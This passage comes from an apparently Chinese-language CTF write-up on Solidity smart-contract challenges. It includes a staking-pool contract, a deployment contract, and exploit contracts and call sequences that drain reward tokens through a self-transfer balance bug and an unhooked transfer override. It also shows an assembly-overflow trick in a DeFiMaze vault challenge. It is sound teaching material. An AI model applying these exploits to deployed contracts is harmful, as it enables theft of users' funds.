  / (PRECISION_FACTOR[_token])</span><br><span class="line">                    - (user.rewardDebt[_token]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    event log_keyvalue(string, uint256);</span><br><span class="line">    /*</span><br><span class="line">     * @notice Update reward variables of the given pool to be up-to-date.</span><br><span class="line">     */</span><br><span class="line">    function _updatePool() internal &#123;</span><br><span class="line">        emit log_keyvalue(&quot;lastRewardBlock&quot;, lastRewardBlock);</span><br><span class="line">        if (block.number &lt;= lastRewardBlock) &#123;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        uint256 stakedTokenSupply = stakedToken.balanceOf(address(this));</span><br><span class="line">        emit log_keyvalue(&quot;stakedTokenSupply&quot;, stakedTokenSupply);</span><br><span class="line">        if (stakedTokenSupply == 0) &#123;</span><br><span class="line">            lastRewardBlock = block.number;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        uint256 multiplier = _getMultiplier(lastRewardBlock, block.number);</span><br><span class="line">        emit log_keyvalue(&quot;multiplier &quot;, multiplier);</span><br><span class="line">        uint256 bscsReward;</span><br><span class="line">        for (uint256 i = 0; i &lt; rewardTokens.length; i++) &#123;</span><br><span class="line">            bscsReward = multiplier * (rewardPerBlock[rewardTokens[i]]);</span><br><span class="line">            accTokenPerShare[rewardTokens[i]] = accTokenPerShare[</span><br><span class="line">                rewardTokens[i]</span><br><span class="line">            ]</span><br><span class="line">             + (</span><br><span class="line">                bscsReward * (PRECISION_FACTOR[rewardTokens[i]]) /  (</span><br><span class="line">                    stakedTokenSupply</span><br><span class="line">                )</span><br><span class="line">            );</span><br><span class="line">            emit log_keyvalue(&quot;accTokenPerShare rewardTokens&quot; , accTokenPerShare[rewardTokens[i]]);</span><br><span class="line">        &#125;</span><br><span class="line">        lastRewardBlock = block.number;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">     * @notice Return reward multiplier over the given _from to _to block.</span><br><span class="line">     * @param _from: block to start</span><br><span class="line">     * @param _to: block to finish</span><br><span class="line">     */</span><br><span class="line">    function _getMultiplier(uint256 _from, uint256 _to)</span><br><span class="line">        internal</span><br><span class="line">        view</span><br><span class="line">        returns (uint256)</span><br><span class="line">    &#123;</span><br><span class="line">        if (_to &lt;= bonusEndBlock) &#123;</span><br><span class="line">            return _to - (_from);</span><br><span class="line">        &#125; else if (_from &gt;= bonusEndBlock) &#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return bonusEndBlock - (_from);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">     * @notice Find element position in array.</span><br><span class="line">     * @param _token: token of which to find position</span><br><span class="line">     * @param _array: array that contains _token</span><br><span class="line">     */</span><br><span class="line">    function findElementPosition(ERC20 _token, ERC20[] storage _array)</span><br><span class="line">        internal</span><br><span class="line">        view</span><br><span class="line">        returns (bool, uint256)</span><br><span class="line">    &#123;</span><br><span class="line">        for (uint256 i = 0; i &lt; _array.length; i++) &#123;</span><br><span class="line">            if (_array[i] == _token) &#123;</span><br><span class="line">                return (true, i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return (false, 0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //**Additional get methods for frontend use */</span><br><span class="line"></span><br><span class="line">    function getUserDebt(address _usr)</span><br><span class="line">        external</span><br><span class="line">        view</span><br><span class="line">        returns (ERC20[] memory, uint256[] memory)</span><br><span class="line">    &#123;</span><br><span class="line">        uint256[] memory userDebt = new uint256[](rewardTokens.length);</span><br><span class="line">        UserInfo storage user = userInfo[_usr];</span><br><span class="line">        for (uint256 i = 0; i &lt; rewardTokens.length; i++) &#123;</span><br><span class="line">            userDebt[i] = user.rewardDebt[rewardTokens[i]];</span><br><span class="line">        &#125;</span><br><span class="line">        return (rewardTokens, userDebt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getUserDebtByToken(address _usr, ERC20 _token)</span><br><span class="line">        external</span><br><span class="line">        view</span><br><span class="line">        returns (uint256)</span><br><span class="line">    &#123;</span><br><span class="line">        UserInfo storage user = userInfo[_usr];</span><br><span class="line">        return (user.rewardDebt[_token]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getAllRewardPerBlock(ERC20[] memory _tokens)</span><br><span class="line">        external</span><br><span class="line">        view</span><br><span class="line">        returns (uint256[] memory)</span><br><span class="line">    &#123;</span><br><span class="line">        uint256[] memory RPBlist = new uint256[](_tokens.length);</span><br><span class="line">        for (uint256 i = 0; i &lt; _tokens.length; i++) &#123;</span><br><span class="line">            RPBlist[i] = rewardPerBlock[_tokens[i]];</span><br><span class="line">        &#125;</span><br><span class="line">        return (RPBlist);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getAllAccTokenPerShared(ERC20[] memory _tokens)</span><br><span class="line">        external</span><br><span class="line">        view</span><br><span class="line">        returns (uint256[] memory)</span><br><span class="line">    &#123;</span><br><span class="line">        uint256[] memory ATPSlist = new uint256[](_tokens.length);</span><br><span class="line">        for (uint256 i = 0; i &lt; _tokens.length; i++) &#123;</span><br><span class="line">            ATPSlist[i] = accTokenPerShare[_tokens[i]];</span><br><span class="line">        &#125;</span><br><span class="line">        return (ATPSlist);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getAllPreFactor(ERC20[] memory _tokens)</span><br><span class="line">        external</span><br><span class="line">        view</span><br><span class="line">        returns (uint256[] memory)</span><br><span class="line">    &#123;</span><br><span class="line">        uint256[] memory PFlist = new uint256[](_tokens.length);</span><br><span class="line">        for (uint256 i = 0; i &lt; _tokens.length; i++) &#123;</span><br><span class="line">            PFlist[i] = PRECISION_FACTOR[_tokens[i]];</span><br><span class="line">        &#125;</span><br><span class="line">        return (PFlist);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //*Override transfer functions, allowing receipts to be transferable */</span><br><span class="line"></span><br><span class="line">    function transfer(address recipient, uint256 amount)</span><br><span class="line">        public</span><br><span class="line">        virtual</span><br><span class="line">        override</span><br><span class="line">        returns (bool)</span><br><span class="line">    &#123;</span><br><span class="line">        UserInfo storage _sender = userInfo[_msgSender()];</span><br><span class="line">        UserInfo storage _receiver = userInfo[recipient];</span><br><span class="line"></span><br><span class="line">        _transfer(_msgSender(), recipient, amount);</span><br><span class="line"></span><br><span class="line">        _sender.amount = _sender.amount - (amount);</span><br><span class="line">        _receiver.amount = _receiver.amount + (amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(</span><br><span class="line">        address sender,</span><br><span class="line">        address recipient,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) public virtual override returns (bool) &#123;</span><br><span class="line">        UserInfo storage _sender = userInfo[sender];</span><br><span class="line">        UserInfo storage _receiver = userInfo[recipient];</span><br><span class="line"></span><br><span class="line">        _transfer(sender, recipient, amount);</span><br><span class="line">        _approve(</span><br><span class="line">            sender,</span><br><span class="line">            _msgSender(),</span><br><span class="line">            allowance(sender, _msgSender()) - (amount)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        _sender.amount = _sender.amount - (amount);</span><br><span class="line">        _receiver.amount = _receiver.amount + (amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getStakingEndBlock() external view returns (uint256) &#123;</span><br><span class="line">        return stakingEndBlock;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getLastStakingBlock(address _user)</span><br><span class="line">        external</span><br><span class="line">        view</span><br><span class="line">        returns (uint256)</span><br><span class="line">    &#123;</span><br><span class="line">        UserInfo storage user = userInfo[_user];</span><br><span class="line">        return user.lastStakingBlock;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="StakingPoolsDeployment-sol"><a href="#StakingPoolsDeployment-sol" class="headerlink" title="StakingPoolsDeployment.sol"></a>StakingPoolsDeployment.sol</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">import &quot;./StakingPools_MT.sol&quot;;</span><br><span class="line">import &quot;./ERC20V2.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract StakingPoolsDeployment &#123;</span><br><span class="line">    StakingPools public stakingPools;</span><br><span class="line">    ERC20 public stakedToken;</span><br><span class="line">    ERC20 public rewardToken;</span><br><span class="line">    ERC20V2 public rewardToken2;</span><br><span class="line">    ERC20[] public rewardTokens;</span><br><span class="line">    address public yourAddress;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        stakingPools = new StakingPools();</span><br><span class="line"></span><br><span class="line">        yourAddress = msg.sender;</span><br><span class="line">		stakedToken = new ERC20(&quot;staked Token&quot;, &quot;sToken&quot;);</span><br><span class="line">        rewardToken = new ERC20(&quot;reward Token 1&quot;, &quot;r1Token&quot;);</span><br><span class="line">        rewardToken2 = new ERC20V2(&quot;reward Token 2&quot;, &quot;r1Token&quot;);</span><br><span class="line">        rewardTokens = new ERC20[](2);</span><br><span class="line">        rewardTokens[0] = rewardToken;</span><br><span class="line">        rewardTokens[1] = ERC20(rewardToken2);</span><br><span class="line">        uint256[] memory rewardPerBlock = new uint256[](2);</span><br><span class="line">        rewardPerBlock[0] = 100000e18;                       </span><br><span class="line">        rewardPerBlock[1] = 100000e18;</span><br><span class="line">        uint256[] memory startEndBlocks = new uint256[](2);</span><br><span class="line">        startEndBlocks[0] = block.number;</span><br><span class="line">        startEndBlocks[1] = block.number + 60;    //bounus lasts 60 blocks</span><br><span class="line">        uint256[] memory stakingBlock = new uint256[](2);</span><br><span class="line">        stakingBlock[0] = block.number;</span><br><span class="line">        stakingBlock[1] = block.number + 60;      //staking lasts 60 blocks</span><br><span class="line">        </span><br><span class="line">        //The max reward for all users should be 10000e18 * 60 = 60000 * 1e18</span><br><span class="line">        stakingPools.initialize(stakedToken, rewardTokens, rewardPerBlock, startEndBlocks, stakingBlock);</span><br><span class="line"></span><br><span class="line">        //The pool has and only has 1e8 * 1e18 reward token, which is greater than 60000 * 1e18</span><br><span class="line">        rewardToken.mint(address(stakingPools), 1e8 * 1e18);</span><br><span class="line">        rewardToken2.mint(address(stakingPools), 1e8 * 1e18);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function faucet() external &#123;</span><br><span class="line">        stakedToken.mint(msg.sender, 100000e18);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function stageA() public view returns(bool) &#123;</span><br><span class="line">        return rewardTokens[0].balanceOf(yourAddress) == 1e8 * 1e18;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function stageB() public view returns(bool) &#123;</span><br><span class="line">        return rewardTokens[1].balanceOf(yourAddress) &gt; 16 * 1e8 * 1e18;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() public view returns(bool) &#123;</span><br><span class="line">        return stageA() &amp;&amp; stageB();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Analysis-5"><a href="#Analysis-5" class="headerlink" title="Analysis"></a>Analysis</h4><p>这道题中使用了两种合约去生成代币，其中<code>ERC20V2</code>合约有一个很典型的逻辑问题造成的漏洞，那就是先去获取<code>from</code>和<code>to</code>的余额，再去进行加减，而当<code>from</code>和<code>to</code>相等的时候，就可以凭空多一些余额了。</p>
<p>接下来就是想办法掏空<code>StakingPools</code>中的<code>rewardTokens</code>了，我们可以看到在题目中，每存入一笔<code>token</code>的存款，就会按照一定比例获得一笔<code>reward</code>的奖励，而这个逻辑在<code>withdraw()</code>和<code>deposit()</code>函数中都会调用到，这看似很完美的逻辑，缺疏漏了<code>transfer()</code>函数，我们可以用一个用户存一笔小钱，再用另一个账户存一笔大钱，再将这笔大钱转入小钱的账户中，这样就可以使得第一个用户获得这个池子中所有的<code>rewardTokens</code>。</p>
<h4 id="Attack-5"><a href="#Attack-5" class="headerlink" title="Attack"></a>Attack</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;./ERC20.sol&quot;;</span><br><span class="line">import &quot;./ERC20V2.sol&quot;;</span><br><span class="line">import &quot;./StakingPools_MT.sol&quot;;</span><br><span class="line">import &quot;./StakingPoolsDeployment.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract StakingPoolAttack&#123;</span><br><span class="line">    StakingPools public stakingPools;</span><br><span class="line">    ERC20 public stakedToken;</span><br><span class="line">    ERC20 public rewardToken;</span><br><span class="line">    ERC20V2 public rewardToken2;</span><br><span class="line">    StakingPoolsDeployment public stakingPoolsDeployment;</span><br><span class="line"></span><br><span class="line">    constructor(address _addr1,address _addr2,address _addr3,address _addr4,address _addr5) &#123;</span><br><span class="line">        stakingPools = StakingPools(_addr1);</span><br><span class="line">        stakedToken = ERC20(_addr2);</span><br><span class="line">        rewardToken = ERC20(_addr3);</span><br><span class="line">        rewardToken2 = ERC20V2(_addr4);</span><br><span class="line">        stakingPoolsDeployment = StakingPoolsDeployment(_addr5);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function DeploystakedToken() public &#123;</span><br><span class="line">        stakingPoolsDeployment.faucet();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function DepoitToPool() public &#123;</span><br><span class="line">        stakedToken.approve(address(stakingPools), 1);</span><br><span class="line">        stakingPools.deposit(1);//And use another user to deposit(99999). And use transfer to this</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        stakingPools.withdraw(10000);</span><br><span class="line">        rewardToken2.transfer(address(this),1e8 * 1e18);</span><br><span class="line">        rewardToken2.transfer(address(this),2e8 * 1e18);</span><br><span class="line">        rewardToken2.transfer(address(this),4e8 * 1e18);</span><br><span class="line">        rewardToken2.transfer(address(this),8e8 * 1e18);</span><br><span class="line">        rewardToken2.transfer(address(this),16e8 * 1e18);</span><br><span class="line">        rewardToken2.transfer(address(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4),32e8 * 1e18);</span><br><span class="line">        rewardToken.transfer(address(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4),1e8 * 1e18);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户A调用DeploystakedToken()=&gt;用户A调用DepoitToPool()=&gt;用户B调用stakingPoolsDeployment.faucet()=》用户B调用stakedToken.approve(address(stakingPools), 99999);stakingPools.deposit(99999);=》用户A调用withdraw()</span><br></pre></td></tr></table></figure>

<h3 id="七-DeFiMaze"><a href="#七-DeFiMaze" class="headerlink" title="七.DeFiMaze"></a>七.DeFiMaze</h3><h4 id="Code-6"><a href="#Code-6" class="headerlink" title="Code"></a>Code</h4><h5 id="SetUp-sol-1"><a href="#SetUp-sol-1" class="headerlink" title="SetUp.sol"></a>SetUp.sol</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.16;</span><br><span class="line"></span><br><span class="line">import &quot;./DeFiPlatform.sol&quot;;</span><br><span class="line">import &quot;./Vault.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract SetUp &#123;</span><br><span class="line"></span><br><span class="line">    DeFiPlatform public platfrom ;</span><br><span class="line">    Vault public vault;</span><br><span class="line">    address public yourAddress;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        platfrom = new DeFiPlatform();</span><br><span class="line">        vault = new Vault();</span><br><span class="line">        platfrom.setVaultAddress(address(vault));</span><br><span class="line">        vault.setPlatformAddress(address(platfrom));</span><br><span class="line"></span><br><span class="line">		yourAddress = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() public view returns(bool) &#123;</span><br><span class="line">        return vault.solved();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="Vault-sol"><a href="#Vault-sol" class="headerlink" title="Vault.sol"></a>Vault.sol</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity 0.8.16;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">    address private owner;</span><br><span class="line">    address public platformAddress;</span><br><span class="line">    bytes32 private flagHash = 0xd6d7b0bbdbe29647e322cd45045b10516d27797eeab3f4649ca54e4ef850bcc2;</span><br><span class="line">    uint256 private secretThreshold = 7 ether;</span><br><span class="line">	bool public solved = false;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setPlatformAddress(address platform) external &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;No permissions!&quot;);</span><br><span class="line">        platformAddress = platform;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function processWithdrawal(address user, uint256 amount) external &#123;</span><br><span class="line">        require(msg.sender == platformAddress, &quot;Unauthorized&quot;);</span><br><span class="line"></span><br><span class="line">        if (amount == secretThreshold) &#123;</span><br><span class="line">            assembly &#123;</span><br><span class="line">                mstore(0, add(user, 0xdeadbeef))</span><br><span class="line">                sstore(keccak256(0, 32), sload(flagHash.slot))</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            payable(user).transfer(amount);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() external&#123;</span><br><span class="line">        bytes32 storedFlag;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            mstore(0, add(caller(), 0xdeadbeef))</span><br><span class="line">            storedFlag := sload(keccak256(0, 32))</span><br><span class="line">        &#125;</span><br><span class="line">		if(storedFlag == flagHash)&#123;</span><br><span class="line">            solved = true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="DeFiPlatform-sol"><a href="#DeFiPlatform-sol" class="headerlink" title="DeFiPlatform.sol"></a>DeFiPlatform.sol</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity 0.8.16;</span><br><span class="line">import &quot;./Vault.sol&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract DeFiPlatform &#123;</span><br><span class="line">    address private owner;</span><br><span class="line">    address public vaultAddress;</span><br><span class="line">    uint256 private constant RATIO = 10**18;</span><br><span class="line">    mapping(address =&gt; uint256) public deposits;</span><br><span class="line">    mapping(address =&gt; bool) private yieldCalculated;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setVaultAddress(address vault) external &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;No permissions!&quot;);</span><br><span class="line">        vaultAddress = vault;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function depositFunds(uint256 amount) external payable &#123;</span><br><span class="line">        require(msg.value == amount, &quot;Incorrect Ether sent&quot;);</span><br><span class="line">        deposits[msg.sender] += amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function calculateYield(uint256 principal, uint256 rate, uint256 time) external returns (uint256) &#123;</span><br><span class="line">        uint256 yieldAmount;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        assembly &#123;</span><br><span class="line">            let r := add(div(rate, 100), RATIO)  </span><br><span class="line">            let t := exp(0x100000000000000000000000000000000, mul(time, 0x10000000000000000))//time = 0即可</span><br><span class="line">            yieldAmount := div(mul(mul(principal, r), sub(t, RATIO)), mul(RATIO, RATIO))</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        deposits[msg.sender] += yieldAmount;</span><br><span class="line">        yieldCalculated[msg.sender] = true;</span><br><span class="line">        return yieldAmount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function requestWithdrawal(uint256 amount) external &#123;</span><br><span class="line">        require(deposits[msg.sender] &gt;= amount, &quot;Insufficient funds&quot;);</span><br><span class="line">        require(yieldCalculated[msg.sender], &quot;You should calculateYield first&quot;); </span><br><span class="line">        Vault vault = Vault(vaultAddress);</span><br><span class="line">        vault.processWithdrawal(msg.sender, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Analysis-6"><a href="#Analysis-6" class="headerlink" title="Analysis"></a>Analysis</h4><p>这道题非常的简单，首先先看<code>Vault</code>合约，我们看到需要让<code>isSolved()</code>合约正常调用我们需要使得<code>keccak256(0,32)</code>的位置存储<code>flagHash</code>的值，这是我们会看到<code>processWithdrawal()</code>这个函数可以实现这个功能，而想实现这个功能就要满足两个要求，一个是调用者为<code>platfromAddress</code>，另一个是<code>amount</code>要为<code>7 ether</code>，要满足这两个要求我们就需要先看<code>DeFiPlatfrom</code>这个合约，看到这个合约我们会发现<code>requestWithdrawal()</code>函数可以满足这个功能，但首先我们自身的存款要有<code>7 ether</code>并且<code>yieldCalculated[msg.sender]</code>为<code>true</code>，这时我们会看到两个函数，<code>depositFunds()</code>和<code>calculateYield()</code>，前者是可以存款，后者可以使<code>yieldCalculated[msg.sender]</code>为<code>true</code>，同时也能改变存款，这是我们注意到后者的汇编当中不存在溢出检测，所以我们只需要后面这个函数即可并随便输入几个参数即可。</p>
<h4 id="Attack-6"><a href="#Attack-6" class="headerlink" title="Attack"></a>Attack</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">platfrom.calculateYield(1,1,0)=》 platfrom.requestWithdrawal(7000000000000000000)=》vault.isSolved()</span><br></pre></td></tr></table></figure>

<h3 id="guessGame"><a href="#guessGame" class="headerlink" title="guessGame"></a>guessGame</h3><h4 id="Code-7"><a href="#Code-7" class="headerlink" title="Code"></a>Code</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span 